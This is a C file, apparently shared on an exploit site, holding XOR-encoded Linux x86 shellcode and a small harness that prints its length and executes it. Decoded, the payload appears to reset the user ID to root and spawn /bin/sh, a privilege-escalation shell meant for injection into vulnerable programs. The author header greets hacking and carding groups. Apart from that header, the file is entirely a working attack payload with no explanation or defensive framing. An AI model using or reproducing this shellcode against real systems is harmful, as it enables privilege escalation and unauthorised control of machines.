/*
Author : gunslinger_ <yudha.gunslinger[at]gmail.com>
Web    : http://devilzc0de.org
blog   : http://gunslingerc0de.wordpress.com
tested on : linux debian
special thanks to : r0073r (inj3ct0r.com), d3hydr8 (darkc0de.com), ty miller (projectshellcode.com), jonathan salwan(shell-storm.org), mywisdom (devilzc0de.org), loneferret (offensive-security.com)
greetzz to all devilzc0de, jasakom, yogyacarderlink, serverisdown, indonesianhacker and all my friend !!
*/

#include <stdio.h>

char shellcode[] = "\xeb\x11\x5e\x31\xc9\xb1\x26\x80\x74\x0e\xff\x01"
		   "\x80\xe9\x01\x75\xf6\xeb\x05\xe8\xea\xff\xff\xff"
		   "\x30\xc1\x30\xda\x30\xc8\x30\xd3\xb1\x47\x30\xda"
		   "\x30\xc8\xcc\x81\xb1\x0a\x52\x69\x2e\x2e\x72\x69"
		   "\x69\x2e\x63\x68\x6f\x88\xe2\x30\xc8\x30\xc8\x52"
		   "\xcc\x81";

int main(void)
{
	fprintf(stdout,"Length: %d\n",strlen(shellcode));
	(*(void(*)()) shellcode)();
}